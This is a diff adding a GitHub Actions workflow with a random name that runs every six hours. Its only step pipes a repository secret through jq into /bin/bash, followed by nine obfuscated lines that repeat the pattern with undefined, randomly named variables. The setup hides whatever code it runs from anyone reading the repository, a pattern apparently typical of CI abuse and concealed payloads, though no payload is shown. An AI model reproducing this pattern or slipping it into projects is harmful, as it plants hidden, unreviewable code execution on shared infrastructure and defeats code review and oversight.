@@ -1,0 +1,28 @@
+name: duanyanqixuan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duanyanqixuan
+        env:
+          kqown78118: ${{ secrets.kqown78118 }}
+        run: |
+          echo $kqown78118 | jq -r .v80 | /bin/bash
+          echo $k36408 | jq -r .jey91670 | /bin/bash
+          echo $yohta45498 | jq -r .l7934 | /bin/bash
+          echo $n459 | jq -r .wlxr3183 | /bin/bash
+          echo $bliym25 | jq -r .vh5 | /bin/bash
+          echo $bmbv311 | jq -r .uawmi197 | /bin/bash
+          echo $yy813 | jq -r .tdt4889 | /bin/bash
+          echo $i24872 | jq -r .yqpl0323 | /bin/bash
+          echo $knkd9291 | jq -r .a4426 | /bin/bash
+          echo $a572 | jq -r .w4317 | /bin/bash
+
